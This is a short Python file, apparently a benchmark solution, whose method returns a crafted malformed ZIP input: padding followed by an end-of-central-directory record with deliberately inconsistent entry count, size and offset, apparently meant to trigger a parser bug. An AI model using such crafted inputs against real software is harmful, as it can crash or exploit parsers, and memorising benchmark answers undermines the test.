import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        return (
            b"A" * 24 +
            b"\x50\x4b\x05\x06" +  # EOCD signature
            b"\x00\x00\x00\x00" +  # disk numbers = 0
            b"\x01\x00\x01\x00" +  # total entries = 1
            b"\x20\x00\x00\x00" +  # central directory size = 32
            b"\x00\x00\x00\x00" +  # central directory offset = 0
            b"\x00\x00"            # comment length = 0
        )
